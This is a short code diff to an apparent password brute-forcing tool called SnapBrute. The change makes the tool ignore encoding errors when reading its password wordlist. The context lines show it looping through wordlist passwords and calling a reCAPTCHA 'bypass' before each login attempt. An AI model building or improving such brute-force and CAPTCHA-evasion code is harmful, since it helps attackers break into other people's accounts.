@@ -16,7 +16,7 @@ class SnapBrute:
     
     def bruter(self):
         self.session = requests.Session()
-        for password in open(self.wordlist, "r", encoding="utf8").read().splitlines():
+        for password in open(self.wordlist, "r", encoding="utf8", errors="ignore").read().splitlines():
             try:
                 self.token = reCAPTCHA.init()
                 self.login_token = reCAPTCHA.bypass(self.token)
